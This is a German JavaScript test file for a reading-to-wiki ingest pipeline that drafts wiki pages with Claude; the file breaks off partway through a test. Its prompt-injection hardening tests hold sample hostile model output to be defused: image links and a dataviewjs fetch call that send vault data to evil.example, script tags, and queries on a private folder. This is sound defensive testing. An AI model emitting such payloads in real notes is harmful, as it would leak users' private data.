import { test, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, existsSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { buildIndex, openIndex } from '../src/vault/index.js';
import { compilePolicy } from '../src/vault/policy.js';
import { createEditor } from '../src/vault/edit.js';
import { createSettingsStore } from '../src/cockpit/settings.js';
import { createReadingStore } from '../src/lesen/store.js';
import { createReadingExport, blockId } from '../src/lesen/vault-export.js';
import { createIngest, createNightlyClock, IngestError } from '../src/lesen/ingest.js';
import { hybridSearch } from '../src/semantic/search.js';
import { parseNote } from '../src/vault/markdown.js';

const quiet = { info() {}, warn() {}, error() {} };
const NOW = new Date('2026-10-25T10:00:00Z');
const HTML = `<p>${'Backpressure hält den elastischen Loop nützlich, sagt Robert Glaser. '.repeat(40)}</p><p>Agenten brauchen Widerstand.</p>`;
let root, idx, editor, settings, store, policy, exporter, doc, highlight, calls, answer, writerOn;

const read = (p) => readFileSync(join(root, p), 'utf8');
const fm = (p) => parseNote(read(p)).frontmatter;
const put = (p, text) => {
  mkdirSync(join(root, p, '..'), { recursive: true });
  writeFileSync(join(root, p), text);
};

const writer = {
  available: () => writerOn,
  async write(job) {
    calls.push(job);
    if (answer instanceof Error) throw answer;
    return typeof answer === 'function' ? answer(job) : answer;
  },
};

function reindex() {
  idx?.close();
  buildIndex({ vaultPath: root, dbPath: ':memory:', policy, logger: quiet, persist: (db, vp) => (idx = openIndex(db, { vaultPath: vp, policy })) });
  editor = createEditor({ vaultPath: root, index: idx });
  exporter = createReadingExport({ vaultPath: root, index: idx, editor, policy, store, settings, now: () => NOW, delayMs: 60_000, logger: quiet });
}

const make = (opts = {}) =>
  createIngest({
    store,
    writer,
    search: (query, o) => hybridSearch({ index: idx, semantic: null, query, ...o }),
    index: idx,
    exporter,
    editor,
    policy,
    settings,
    vaultPath: root,
    logger: quiet,
    now: () => NOW,
    resumeDelayMs: 0,
    ...opts,
  });

/** Antwort, wie Claude sie liefern könnte, mit allem, was die Nachbearbeitung abfangen muss. */
const CLAUDE = () => ({
  digest: {
    kernaussagen: ['Backpressure macht lange Loops möglich.'],
    neu: ['Der Loop als Gang, nicht als Leiter.'],
    bestaetigt: [{ path: 'wiki/questions/widerstand.md', claim: 'Widerstand hilft' }, { path: 'wiki/concepts/gibt-es-nicht.md', claim: 'erfunden' }],
    widerspricht: [{ path: 'wiki/concepts/backpressure.md', claim: 'nur technisch', vorschlag: 'beide Schichten' }],
    dockt_an: [
      { path: 'wiki/concepts/backpressure.md', warum: 'Kernbegriff' },
      { path: 'wiki/privat/geheim.md', warum: 'vertraulich' },
      { path: 'wiki/concepts/gibt-es-nicht.md', warum: 'erfunden' },
      { path: '[[backpressure]]', warum: 'doppelt' },
    ],
  },
  source: {
    slug: 'Glaser – Der Elastische Löop',
    title: 'Der elastische Loop',
    summary: 'Loop-Größe, Backpressure und Grading als Delegationsmodell für Agentenarbeit, sehr lang erklärt',
    confidence: 'mittel',
    tags: ['Agentic Engineering', '#Backpressure', 'agents'],
    body: '# Doppelte Überschrift\n\nGlaser verbindet [[backpressure|Backpressure]] mit [[elastischer-loop]] und [[Robert Glaser]]; dazu [[unbekannt]] und [[synthese-loops|Synthese]].',
  },
  neu: [
    { kind: 'entity', slug: 'robert-glaser', title: 'Robert Glaser', summary: 'Autor', entity_type: 'person', body: 'Autor.', warum: 'Autor des Texts' },
    { kind: 'concept', slug: 'elastischer-loop', title: 'Elastischer Loop', summary: 'Loop mit Checkpoints', body: 'Siehe [[backpressure]] und [[nirgends]].', warum: 'Kernbegriff', tags: ['loops'] },
    { kind: 'synthesis', slug: 'synthese-loops', title: 'Loops im Vergleich', summary: 'Vergleich', art: 'quatsch', beteiligte: ['wiki/concepts/backpressure.md', 'wiki/x.md'], body: 'Text.', warum: 'trägt' },
    { kind: 'question', slug: 'wie-weit-strecken', title: 'Wie weit lässt sich der Loop strecken?', summary: 'Frage', body: 'Offen.', warum: 'offen' },
    { kind: 'entity', slug: 'geheimer-mensch', title: 'Geheim', summary: 'x', entity_type: 'alien', body: '', warum: 'x' },
    { kind: 'stub', slug: 'x', title: 'x', summary: 'x', body: '', warum: 'x' },
  ],
  relationen: [
    { type: 'uses', to: 'wiki/concepts/backpressure.md' },
    { type: 'uses', to: 'backpressure' },
    { type: 'mag', to: 'wiki/concepts/backpressure.md' },
    { type: 'related-to', to: 'wiki/concepts/gibt-es-nicht.md' },
  ],
  hinweise: ['Lies auch [[unbekannt]]'],
});

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'ingest-vault-'));
  put('inbox/Start.md', '# Start\n');
  put('wiki/concepts/backpressure.md', "---\ntype: concept\ntitle: Backpressure\nsummary: Widerstand für Agent-Output\ncreated: '2026-06-23'\nupdated: '2026-06-23'\nsources:\n  - '[[glaser-the-elastic-loop]]'\ntags: [agents]\nstatus: active\nconfidence: medium\n---\n\n# Backpressure\n\nBackpressure ist Widerstand für Agenten im Loop.\n");
  put('wiki/entities/robert-glaser.md', '---\ntype: entity\nentity-type: person\ntitle: Robert Glaser\nsummary: Autor\nsources:\n  - "[[alt]]"\nstatus: faded\n---\n\n# Robert Glaser\n\nAutor von Loop-Texten.\n\n## Quellen\n\n- [[alt]]\n\n## Verwandt\n\n- [[backpressure]]\n');
  put('wiki/questions/widerstand.md', '---\ntype: question\ntitle: Hilft Widerstand?\nsummary: Frage nach Widerstand\nstatus: faded\n---\n\n# Hilft Widerstand?\n\nWiderstand für Agenten im Loop.\n');
  put('wiki/privat/geheim.md', '---\ntype: concept\ntitle: Geheim\n---\n\n# Geheim\n\nBackpressure geheim.\n');
  put('wiki/log.md', '# Log\n\n## [2026-10-01] ingest | Alt\n- Source-Page: [[alt]]\n');
  policy = compilePolicy({ exclude: ['^wiki/log\\.md$'], sensitive: { 'wiki/privat': 'privat' }, readwise: '30-ressourcen/readwise' });
  settings = createSettingsStore({ defaults: { tz: 'Europe/Berlin' }, logger: quiet });
  store = createReadingStore({ path: ':memory:', now: () => NOW.getTime() });
  ({ doc } = store.addDocument({ url: 'https://glaser.test/loop', title: 'The Elastic Loop', site: 'Glaser', status: 'stapel', content_html: HTML, excerpt: 'Wie weit kannst du den Loop strecken?' }));
  highlight = store.addHighlight({ doc_id: doc.id, quote: 'Backpressure hält den elastischen Loop nützlich', note: 'Kern [[nicht]] verlinken', start_hint: 0 });
  calls = [];
  answer = CLAUDE();
  writerOn = true;
  idx = null;
  reindex();
});
afterEach(() => {
  exporter.stop();
  idx.close();
  store.close();
  rmSync(root, { recursive: true, force: true });
});

async function drafted(ingest = make()) {
  const r = ingest.request([doc.id]);
  assert.deepEqual(r.queued, [doc.id]);
  await ingest.idle();
  const row = ingest.get(doc.id);
  assert.equal(row.status, 'bereit', row.error);
  return { ingest, row };
}

test('Entwurf: Text, Markierungen und Kandidaten gehen an Claude; die Antwort wird nach Vertrag nachbearbeitet', async () => {
  const { row } = await drafted();
  assert.equal(calls.length, 1);
  const input = calls[0].input;
  assert.match(input, /<text titel="The Elastic Loop" quelle="Glaser" url="https:\/\/glaser.test\/loop">/);
  assert.match(input, /1\. „Backpressure hält den elastischen Loop nützlich“ — Notiz: Kern \[\[nicht\]\] verlinken/);
  assert.match(input, /- wiki\/concepts\/backpressure\.md · concept · Backpressure — Widerstand für Agent-Output/);
  assert.doesNotMatch(input, /geheim|wiki\/log\.md/);
  assert.equal(calls[0].schema.required.includes('digest'), true);

  const d = row.draft;
  assert.equal(d.version, 1);
  assert.equal(row.model, 'sonnet');
  assert.equal(row.origin, 'knopf');
  assert.equal(row.doc.title, 'The Elastic Loop');
  assert.deepEqual(d.source.slug, 'glaser-der-elastische-loeop');
  assert.equal(d.source.confidence, 'medium');
  assert.ok(d.source.summary.length <= 80 && d.source.summary.endsWith('…'));
  assert.deepEqual(d.source.tags, ['agentic-engineering', 'backpressure', 'agents']);
  // H1 weg, Links nur auf Kandidaten, neue oder vorhandene Seiten; der Rest wird Text.
  assert.equal(d.source.body, 'Glaser verbindet [[backpressure|Backpressure]] mit [[elastischer-loop]] und [[robert-glaser]]; dazu unbekannt und [[synthese-loops|Synthese]].');

  const summary = d.items.map((i) => `${i.id} ${i.kind} ${i.action ?? i.type ?? ''} ${i.path ?? i.slug ?? i.to} ${i.default}`);
  assert.deepEqual(summary, [
    'v1 concept verknuepfen wiki/concepts/backpressure.md true',
    // „neue“ Entity, die es schon gibt → verknüpfen
    'v2 entity verknuepfen wiki/entities/robert-glaser.md true',
    'n1 concept neu elastischer-loop false',
    's1 synthesis neu synthese-loops false',
    'q1 question neu wie-weit-strecken false',
    'n2 entity neu geheimer-mensch false',
    'b1 bestaetigung  wiki/questions/widerstand.md true',
    'r1 relation uses wiki/concepts/backpressure.md true',
  ]);
  // Verknüpfen trägt `entity_type` aus dem Frontmatter, damit die Oberfläche „Person“ zeigt statt „Entity“.
  assert.equal(d.items.find((i) => i.id === 'v2').entity_type, 'person');
  assert.equal('entity_type' in d.items.find((i) => i.id === 'v1'), false);
  const s1 = d.items.find((i) => i.id === 's1');
  assert.equal(s1.art, 'querverbindung');
  assert.deepEqual(s1.beteiligte, ['wiki/concepts/backpressure.md']);
  assert.equal(d.items.find((i) => i.id === 'n2').entity_type, undefined);
  assert.equal(d.items.find((i) => i.id === 'n1').body, 'Siehe [[backpressure]] und nirgends.');
  assert.deepEqual(d.items.find((i) => i.id === 'n1').tags, ['loops']);
  assert.equal(d.items.find((i) => i.id === 'r1').title, 'Backpressure');
  assert.deepEqual(d.digest.dockt_an.map((x) => x.path), ['wiki/concepts/backpressure.md', 'wiki/concepts/backpressure.md']);
  assert.deepEqual(d.digest.bestaetigt, [{ path: 'wiki/questions/widerstand.md', title: 'Hilft Widerstand?', claim: 'Widerstand hilft' }]);
  assert.deepEqual(d.hinweise, ['Widerspruch zu [[backpressure]] – Auflösung per /wiki-lint', 'Lies auch unbekannt']);

  const ingest = make();
  const [listed] = ingest.list({ status: 'bereit' });
  assert.ok(listed.draft.items.every((i) => !('body' in i) && !('warum' in i)), 'Liste ohne Body und Begründung');
  assert.equal(listed.draft.items.length, ingest.get(doc.id).draft.items.length);
  assert.deepEqual(listed.draft.digest.kernaussagen, ['Backpressure macht lange Loops möglich.']);
  assert.deepEqual(listed.item_counts, { total: 8, default: 4, neu: 4, verknuepfen: 2, bestaetigung: 1, relation: 1 });
  assert.deepEqual(ingest.counts(), { wartet: 0, entwirft: 0, bereit: 1, fehler: 0 });
  assert.equal(ingest.statusFor([doc.id, 'x']).get(doc.id), 'bereit');
  // Ohne force kein zweiter Entwurf, mit force schon.
  assert.deepEqual(ingest.request([doc.id]).queued, []);
  assert.deepEqual(ingest.request([doc.id], { force: true }).queued, [doc.id]);
  await ingest.idle();
  assert.equal(calls.length, 2);
});

test('Entwurf: ohne Claude 409, Claude-Fehler wird „fehler“, unbekanntes Dokument 404', async () => {
  writerOn = false;
  assert.deepEqual(make().available(), { ok: false, reason: 'Ingest braucht Claude: CLAUDE_CODE_OAUTH_TOKEN im Deployment (Token aus `claude setup-token`)' });
  assert.throws(() => make().request([doc.id]), (e) => e instanceof IngestError && e.status === 409);
  writerOn = true;
  assert.throws(() => make().request(['nope']), (e) => e.status === 404);
  answer = new Error('Claude: Limit erreicht');
  const ingest = make();
  ingest.request([doc.id]);
  await ingest.idle();
  assert.equal(ingest.get(doc.id).status, 'fehler');
  assert.equal(ingest.get(doc.id).error, 'Claude: Limit erreicht');
  assert.equal(store.get(doc.id).status, 'stapel');
});

test('Übernehmen: Rohquelle, Source-Page, neue Seiten, Verknüpfungen, Log, Archiv; ein zweites Mal ändert nichts', async () => {
  const { ingest } = await drafted();
  await assert.rejects(ingest.apply(doc.id, { items: ['v1', 'zz'] }), (e) => e instanceof IngestError && e.status === 400 && /zz/.test(e.message));

  const r = await ingest.apply(doc.id, { items: ['v1', 'v2', 'n1', 'b1', 'r1'], source: { title: 'Der elastische Loop (Glaser)', tags: 'agents, Loops' } });
  const slug = 'glaser-der-elastische-loeop';
  const raw = 'raw/2026-10-25_the-elastic-loop.md';
  assert.deepEqual(r, {
    source: `wiki/sources/${slug}.md`,
    raw,
    written: [`wiki/sources/${slug}.md`, 'wiki/concepts/elastischer-loop.md'],
    // Nur bestätigt ist nicht verknüpft: eigenes Feld, wie im Log.
    linked: ['wiki/concepts/backpressure.md', 'wiki/entities/robert-glaser.md'],
    confirmed: ['wiki/questions/widerstand.md'],
  });
  // Die Rohquelle bekommt im Ingest des Cockpits nie `ingest: offen`, erst das Datum (f).
  assert.doesNotMatch(read(raw), /^ingest: offen$/m);

  // (a) Rohquelle mit Volltext, gelesen, mit Verweis aufs Wiki (f)
  const rawText = read(raw);
  assert.match(rawText, /## Text\n\n<!-- cockpit:text:start/);
  const rawFm = fm(raw);
  assert.equal(rawFm.lesestatus, 'gelesen');
  assert.equal(rawFm.ingest, '2026-10-25');
  assert.match(rawText, new RegExp(`^wiki_source: "\\[\\[${slug}\\]\\]"$`, 'm'));

  // (b) Source-Page
  const src = read(r.source);
  const hl = blockId(highlight.id);
  assert.equal(
    src,
    `---
type: source
title: "Der elastische Loop (Glaser)"
summary: "${fm(r.source).summary}"
created: 2026-10-25
updated: 2026-10-25
sources:
  - "${raw}"
url: "https://glaser.test/loop"
tags:
  - agents
  - loops
status: active
confidence: medium
relations:
  - "uses [[backpressure]]"
---

# Der elastische Loop (Glaser)

Glaser verbindet [[backpressure|Backpressure]] mit [[elastischer-loop]] und [[robert-glaser]]; dazu unbekannt und Synthese.

## Markiert

- „Backpressure hält den elastischen Loop nützlich“ → [[2026-10-25_the-elastic-loop#^${hl}]]
  Notiz: Kern nicht verlinken

## Quelle

- Rohquelle: [[2026-10-25_the-elastic-loop]]
- Original: <https://glaser.test/loop>
`,
  );
  assert.ok(rawText.includes(`^${hl}`), 'Block-ID steht in der Rohquelle');

  // (c) neue Seite
  const concept = read('wiki/concepts/elastischer-loop.md');
  assert.match(concept, /^type: concept$/m);
  assert.match(concept, new RegExp(`^sources:\\n  - "\\[\\[${slug}\\]\\]"$`, 'm'));
  assert.match(concept, /^tags:\n  - loops$/m);
  assert.match(concept, /# Elastischer Loop\n\nSiehe \[\[backpressure\]\] und nirgends\.\n\n## Quellen\n\n- \[\[glaser-der-elastische-loeop\]\]\n$/);
  assert.ok(!existsSync(join(root, 'wiki/synthesis/synthese-loops.md')), 'Abgewähltes bleibt weg');

  // (d) verknüpft, bestätigt, reaktiviert
  const bp = fm('wiki/concepts/backpressure.md');
  assert.deepEqual(bp.sources, ['[[glaser-the-elastic-loop]]', `[[${slug}]]`]);
  assert.equal(bp.updated, '2026-10-25');
  assert.match(read('wiki/concepts/backpressure.md'), new RegExp(`Agenten im Loop\\.\\n\\n## Quellen\\n\\n- \\[\\[${slug}\\]\\]\\n$`));
  const rg = fm('wiki/entities/robert-glaser.md');
  assert.equal(rg.status, 'active');
  assert.deepEqual(rg.sources, ['[[alt]]', `[[${slug}]]`]);
  assert.match(read('wiki/entities/robert-glaser.md'), new RegExp(`## Quellen\\n\\n- \\[\\[alt\\]\\]\\n- \\[\\[${slug}\\]\\]\\n\\n## Verwandt`));
  const q = fm('wiki/questions/widerstand.md');
  assert.equal(q.confirmed, '2026-10-25');
  assert.equal(q.updated, undefined);
  assert.equal(q.status, 'open');

  // (e) Log, direkt angehängt (die Policy schließt es aus dem Index aus)
  const log = read('wiki/log.md');
  assert.ok(
    log.endsWith(`
## [2026-10-25] ingest (cockpit) | Der elastische Loop (Glaser)
- Source-Page: [[${slug}]]
- Rohquelle: ${raw}
- Neu: [[elastischer-loop]]
- Verknüpft: [[backpressure]], [[robert-glaser]]
- Bestätigt: [[widerstand]]
`),
    log,
  );

  // (g) archiviert, gelesen
  assert.equal(store.get(doc.id).status, 'archiv');
  assert.ok(store.get(doc.id).read_at);
  const row = ingest.get(doc.id);
  assert.equal(row.status, 'uebernommen');
  assert.ok(row.applied_at);
  assert.deepEqual(row.applied.steps, ['raw', 'source', 'log', 'raw_frontmatter', 'archiv']);

  // Zweites Übernehmen: dasselbe Ergebnis, nichts doppelt.
  const before = ['wiki/log.md', r.source, 'wiki/concepts/backpressure.md', raw].map(read);
  assert.deepEqual(await ingest.apply(doc.id, { items: ['v1'] }), r);
  assert.deepEqual(['wiki/log.md', r.source, 'wiki/concepts/backpressure.md', raw].map(read), before);
  assert.throws(() => ingest.discard(doc.id), (e) => e.status === 409);
});

test('Übernehmen: Kollision beim Slug hängt eine Kurz-ID an; Links auf abgewählte neue Seiten werden Text', async () => {
  put('wiki/sources/glaser-der-elastische-loeop.md', '---\ntype: source\ntitle: Fremd\nsources:\n  - raw/anders.md\n---\n# Fremd\n');
  reindex();
  const { ingest } = await drafted();
  const r = await ingest.apply(doc.id, { items: [], source: { slug: 'Glaser Der Elastische Löop' } });
  assert.equal(r.source, `wiki/sources/glaser-der-elastische-loeop-${blockId(doc.id).slice(3, 9)}.md`);
  assert.match(read(r.source), /mit Elastischer Loop und \[\[robert-glaser\]\]/);
  assert.deepEqual(r.linked, []);
  assert.match(read('wiki/log.md'), /- Neu: —\n- Verknüpft: —\n- Bestätigt: —\n$/);
});

test('Übernehmen: Abbruch mittendrin wird gemerkt, der nächste Versuch setzt fort', async () => {
  const { ingest: first } = await drafted();
  const real = editor.setFrontmatter;
  let fail = true;
  editor.setFrontmatter = (args) => {
    if (fail && args.path === 'wiki/entities/robert-glaser.md') throw new Error('"wiki/entities/robert-glaser.md" wurde gerade anderweitig geändert.');
    return real(args);
  };
  const items = ['v1', 'v2', 'n1', 'r1'];
  await assert.rejects(first.apply(doc.id, { items }), (e) => e.status === 409 && /unterbrochen.*anderweitig geändert\. Der Fortschritt/.test(e.message) && !e.message.includes('..'));
  let row = first.get(doc.id);
  assert.equal(row.status, 'bereit');
  assert.match(row.error, /anderweitig/);
  assert.deepEqual(row.applied.steps, ['raw', 'source']);
  assert.deepEqual(Object.keys(row.applied.items), ['n1', 'v1']);
  assert.equal(store.get(doc.id).status, 'stapel');

  // Neustart dazwischen: neue Instanz, gleicher Stand.
  fail = false;
  const second = make();
  const r = await second.apply(doc.id, { items });
  assert.deepEqual(r.written, ['wiki/sources/glaser-der-elastische-loeop.md', 'wiki/concepts/elastischer-loop.md']);
  assert.deepEqual(r.linked, ['wiki/concepts/backpressure.md', 'wiki/entities/robert-glaser.md']);
  // Bereits verknüpftes nicht doppelt.
  assert.equal(read('wiki/concepts/backpressure.md').split('glaser-der-elastische-loeop').length - 1, 2);
  assert.equal(read('wiki/log.md').split('ingest (cockpit)').length - 1, 1);
  row = second.get(doc.id);
  assert.equal(row.status, 'uebernommen');
  assert.equal(row.error, null);
});

test('Verwerfen: Entwurf weg, Text bleibt; „done“ erledigt ohne Wiki mit Lesedatum', async () => {
  const { ingest } = await drafted();
  const row = ingest.discard(doc.id);
  assert.equal(row.status, 'verworfen');
  assert.equal(row.draft, null);
  assert.equal(store.get(doc.id).status, 'stapel');
  await assert.rejects(ingest.apply(doc.id, { items: [] }), (e) => e.status === 409);
  // Verworfenes holt der Stapel-Lauf nicht wieder.
  assert.equal(ingest.requestStack(), 0);
  ingest.discard(doc.id, { done: true });
  assert.equal(store.get(doc.id).status, 'weg');
  assert.ok(store.get(doc.id).read_at);
  assert.ok(!existsSync(join(root, 'wiki/sources')));
  assert.throws(() => ingest.discard('nope'), (e) => e.status === 404);
});

test('Stapel und Nachtlauf: nur Stapel-Dokumente ohne Entwurf, höchstens `limit`, nur wenn eingeschaltet', async () => {
  const more = [1, 2, 3].map((n) => store.addDocument({ url: `https://glaser.test/${n}`, title: `Text ${n}`, status: 'stapel', content_html: HTML }).doc);
  store.addDocument({ url: 'https://glaser.test/eingang', title: 'Eingang', status: 'eingang', content_html: HTML });
  const ingest = make();
  settings.save({ ingest: { nightly: false }, calendars: [] });
  assert.equal(ingest.nightly(), 0);
  settings.save({ ingest: { nightly: true, limit: 2 }, calendars: [] });
  assert.equal(ingest.nightly(), 2);
  await ingest.idle();
  // Älteste zuerst: das erste Dokument und Text 1.
  assert.deepEqual([doc, ...more].map((d) => ingest.statusFor([d.id]).get(d.id) ?? null), ['bereit', 'bereit', null, null]);
  assert.equal(ingest.get(doc.id).origin, 'nacht');
  assert.equal(ingest.requestStack({ origin: 'knopf' }), 2);
  await ingest.idle();
  assert.equal(ingest.counts().bereit, 4);
  assert.equal(ingest.requestStack(), 0);
  writerOn = false;
  assert.equal(ingest.nightly(), 0);
});

test('Nachtlauf-Takt: einmal je Tag zur eingestellten Stunde in der Zeitzone, gemerkt in einer Datei', () => {
  let runs = 0;
  let t = new Date('2026-10-25T01:30:00Z'); // 02:30 in Berlin (Winterzeit ab heute)
  const file = join(root, 'data', 'ingest-nacht.txt');
  const clock = () => createNightlyClock({ ingest: { nightly: () => ++runs }, settings, file, now: () => t, logger: quiet });
  assert.equal(clock().tick(), null);
  t = new Date('2026-10-25T02:10:00Z'); // 03:10
  assert.equal(clock().tick(), 1);
  assert.equal(clock().tick(), null, 'heute schon gelaufen, auch nach einem Neustart');
  assert.equal(readFileSync(file, 'utf8'), '2026-10-25\n');
  t = new Date('2026-10-26T02:05:00Z');
  settings.save({ ingest: { nightly: false }, calendars: [] });
  assert.equal(clock().tick(), null);
  settings.save({ ingest: { hour: 3 }, calendars: [] });
  assert.equal(clock().tick(), 2);
});

test('Neustart: ein angefangener Entwurf wird wieder eingereiht und fertig', async () => {
  store.saveIngest(doc.id, { status: 'entwirft', origin: 'nacht' });
  const ingest = make();
  assert.equal(ingest.get(doc.id).status, 'wartet');
  await ingest.idle();
  assert.equal(ingest.get(doc.id).status, 'bereit');
  assert.equal(ingest.get(doc.id).origin, 'nacht');
});

test('Policy: nichts in vertraulichen Ordnern, weder vorgeschlagen noch geschrieben', async () => {
  policy = compilePolicy({ exclude: ['^wiki/log\\.md$'], sensitive: { 'wiki/privat': 'privat', 'wiki/entities': 'personen' } });
  reindex();
  const { ingest, row } = await drafted();
  const d = row.draft;
  assert.ok(!d.items.some((i) => i.kind === 'entity' || String(i.path ?? i.to ?? '').startsWith('wiki/entities/')));
  assert.ok(d.hinweise.includes('„Robert Glaser“ nicht vorgeschlagen: wiki/entities ist vertraulich oder ausgeschlossen'));
  // Ein Link auf die vertrauliche Entity wird im Body Text.
  assert.match(d.source.body, /mit \[\[elastischer-loop\]\] und Robert Glaser;/);

  // Ist der Quellen-Ordner inzwischen vertraulich, schreibt Übernehmen nichts.
  policy = compilePolicy({ sensitive: { 'wiki/sources': 'x' } });
  reindex();
  await assert.rejects(make().apply(doc.id, { items: ['v1'] }), (e) => e.status === 409 && /wiki\/sources/.test(e.message));
  assert.ok(!existsSync(join(root, 'wiki/sources')));
  assert.equal(ingest.get(doc.id).status, 'bereit');
});

// --- Absicherung: Prompt-Injection, Doppel-Ingest, Kollisionen -------------------------

test('Entschärfen: Bilder von fremden Servern, HTML, Templater und ausführbare Code-Blöcke aus Claudes Text landen nicht im Wiki', async () => {
  const evil = [
    'Siehe ![x](https://evil.example/?d=geheim) und <img src="https://evil.example/p.png"> und <script>alert(1)</script>.',
    '<%* tR += 1 %>',
    '```dataviewjs',
    "dv.paragraph(await fetch('https://evil.example/?d=' + dv.pages().length))",
    '```',
    '> ~~~query',
    '> path:privat',
    '> ~~~',
    'Inline: `$= dv.pages().length` und `<% tp.file.title %>`; Autolink <https://glaser.test/loop> bleibt.',
  ].join('\n');
  answer = { ...CLAUDE(), source: { ...CLAUDE().source, title: 'Loop <img src=https://evil.example/t.png> <% tp.x %>', body: evil } };
  answer.neu = [{ ...CLAUDE().neu[1], body: '```dataview\nTABLE file.name FROM "wiki/privat"\n```\n![](http://evil.example/n)' }];
  const { ingest, row } = await drafted();
  assert.doesNotMatch(row.draft.source.body, /!\[x\]|<script|```dataviewjs/, 'schon die Vorschau ist entschärft');
  const r = await ingest.apply(doc.id, { items: ['n1'] });
  const src = read(r.source);
  // Templater liest auch das Frontmatter; dort ist der Titel ein YAML-String, kein HTML.
  assert.doesNotMatch(src, /<%/);
  assert.match(src, /^title: "Loop <img src=https:\/\/evil\.example\/t\.png> <​% tp\.x %>"$/m);
  const body = src.split('\n---\n')[1];
  assert.doesNotMatch(body, /!\[|<img|<script|```dataviewjs|~~~query/);
  assert.match(body, /^# Loop &lt;img src=https:\/\/evil\.example\/t\.png> &lt;% tp\.x %>$/m);
  assert.match(src, /Siehe \[x\]\(https:\/\/evil\.example\/\?d=geheim\) und &lt;img src="https:\/\/evil\.example\/p\.png"> und &lt;script>alert\(1\)&lt;\/script>\./);
  assert.match(src, /\n```text\ndv\.paragraph/);
  assert.match(src, /\n> ~~~text\n> path:privat\n> ~~~\n/);
  assert.match(src, /`​\$= dv\.pages\(\)\.length` und `<​% tp\.file\.title %>`; Autolink <https:\/\/glaser\.test\/loop> bleibt\./);
  const concept = read('wiki/concepts/elastischer-loop.md');
  assert.match(concept, /```text\nTABLE file\.name/);
  assert.match(concept, /\n\[\]\(http:\/\/evil\.example\/n\)\n/);
});

test('Entschärfen: `<…>` in Markierungsnotiz und Zitat erscheint in Source-Page und Rohquelle als Text', async () => {
  store.addHighlight({ doc_id: doc.id, quote: 'Agenten brauchen <Widerstand>', note: '<b>wichtig</b> ![](https://evil.example/?d=notiz)', start_hint: 100 });
  const { ingest } = await drafted();
  const r = await ingest.apply(doc.id, { items: [] });
  const src = read(r.source);
  assert.match(src, /- „Agenten brauchen &lt;Widerstand>“ → /);
  assert.match(src, /\n {2}Notiz: &lt;b>wichtig&lt;\/b> \[\]\(https:\/\/evil\.example\/\?d=notiz\)\n/);
  const raw = read(r.raw);
  assert.match(raw, /^> Agenten brauchen &lt;Widerstand>$/m);
  assert.match(raw, /^&lt;b>wichtig&lt;\/b> \[\]\(https:\/\/evil\.example\/\?d=notiz\)$/m);
  assert.doesNotMatch(raw, /<b>|!\[\]\(https/);
});

test('Doppel-Ingest: kein `ingest: offen` nach einem Abbruch; schon ingestierte Rohquelle → kein Entwurf, Übernehmen 409', async () => {
  const { ingest } = await drafted();
  const real = editor.setFrontmatter;
  editor.setFrontmatter = (args) => {
    if (args.path.startsWith('wiki/')) throw new Error('gleichzeitig geändert');
    return real(args);
  };
  await assert.rejects(ingest.apply(doc.id, { items: ['v1'] }), (e) => e.status === 409);
  editor.setFrontmatter = real;
  const raw = exporter.notePath(doc.id);
  assert.ok(raw);
  assert.doesNotMatch(read(raw), /^ingest:/m, 'der Skill holt die Rohquelle nicht dazwischen');

  // Der Skill war doch schneller: Übernehmen lehnt ab, nichts mehr geschrieben.
  editor.setFrontmatter({ path: raw, set: { ingest: '2026-10-24' } });
  await assert.rejects(ingest.apply(doc.id, { items: ['v1'] }), (e) => e.status === 409 && /Schon im Wiki \(ingest: 2026-10-24\)/.test(e.message));
  assert.deepEqual(fm('wiki/concepts/backpressure.md').sources, ['[[glaser-the-elastic-loop]]']);

  // Ein anderer Text, den der Skill schon geholt (oder übersprungen) hat: kein Entwurf, Claude bleibt unbefragt.
  for (const mark of ['2026-10-20', 'übersprungen']) {
    const { doc: other } = store.addDocument({ url: `https://glaser.test/${mark}`, title: `Schon da ${mark}`, status: 'stapel', content_html: HTML });
    const path = exporter.save(other.id, { read: true, fullText: true }).path;
    editor.setFrontmatter({ path, set: { ingest: mark } });
    const before = calls.length;
    const fresh = make();
    fresh.request([other.id]);
    await fresh.idle();
    const row = fresh.get(other.id);
    assert.equal(row.status, 'verworfen');
    assert.match(row.error, mark === 'übersprungen' ? /übersprungen/ : /Schon im Wiki \(ingest: 2026-10-20\)/);
    assert.equal(calls.length, before);
  }
});

test('Doppel-Ingest: liegt am gemerkten Pfad der Source-Page inzwischen eine fremde Seite, bekommt die eigene einen neuen Namen', async () => {
  const { ingest } = await drafted();
  const real = editor.create;
  editor.create = (args) => {
    if (args.folder === 'wiki/sources') throw new Error('Platte voll');
    return real(args);
  };
  await assert.rejects(ingest.apply(doc.id, { items: [] }), (e) => e.status === 409);
  assert.deepEqual(ingest.get(doc.id).applied.steps, ['raw']);
  const foreign = '---\ntype: source\ntitle: Fremd\nsources:\n  - raw/anders.md\n---\n# Fremd\n';
  put('wiki/sources/glaser-der-elastische-loeop.md', foreign);
  reindex();
  const r = await make().apply(doc.id, { items: [] });
  assert.equal(r.source, `wiki/sources/glaser-der-elastische-loeop-${blockId(doc.id).slice(3, 9)}.md`);
  assert.equal(read('wiki/sources/glaser-der-elastische-loeop.md'), foreign);
  assert.match(read(r.source), /^title: "Der elastische Loop"$/m);
});

test('Kollision: derselbe Dateiname anderswo im Vault (auch vertraulich) → Source-Page mit Kurz-ID, neue Seite nicht vorgeschlagen', async () => {
  put('wiki/privat/elastischer-loop.md', '---\ntype: concept\ntitle: Privat\n---\n# Privat\n');
  put('30-ressourcen/glaser-der-elastische-loeop.md', '# Notiz mit demselben Namen\n');
  reindex();
  const { ingest, row } = await drafted();
  assert.ok(!row.draft.items.some((i) => i.slug === 'elastischer-loop'), 'keine zweite [[elastischer-loop]]');
  assert.ok(row.draft.hinweise.includes('„Elastischer Loop“ nicht vorgeschlagen: den Namen „elastischer-loop“ gibt es im Vault schon'));
  const r = await ingest.apply(doc.id, { items: [] });
  assert.equal(r.source, `wiki/sources/glaser-der-elastische-loeop-${blockId(doc.id).slice(3, 9)}.md`);
});

test('Kollision beim Übernehmen: neue Seite, deren Name inzwischen anderswo vergeben ist, wird verknüpft oder weggelassen', async () => {
  await drafted();
  // Seit dem Entwurf: eine beschreibbare Wiki-Seite mit dem Namen der Frage, eine vertrauliche mit dem des Konzepts.
  put('wiki/synthesis/wie-weit-strecken.md', '---\ntype: synthesis\ntitle: Strecken\n---\n# Strecken\n');
